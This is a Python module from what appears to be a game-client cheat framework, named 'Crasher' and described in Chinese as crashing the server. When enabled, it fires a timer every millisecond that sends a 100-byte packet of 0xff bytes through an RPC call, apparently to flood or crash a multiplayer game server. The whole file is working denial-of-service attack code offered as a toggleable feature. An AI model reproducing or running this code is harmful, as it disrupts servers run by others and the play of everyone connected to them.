# -*- coding: utf-8 -*-

from ..module import Module, Category
from ...api import modapi, client

class Crasher(Module):
    def __init__(self):
        Module.__init__(self, "Crasher", "崩服。", Category.MISC, None)

        self.timer = None

    def OnEnable(self):
        self.timer = client.AddRepeatedTimer(0.001, self.Crasher_Func)

    def OnDisable(self):
        if self.timer is not None:
            client.CancelTimer(self.timer)

    def Crasher_Func(self):
        modapi.SendPyRpcPacket(b'\xff' * 100)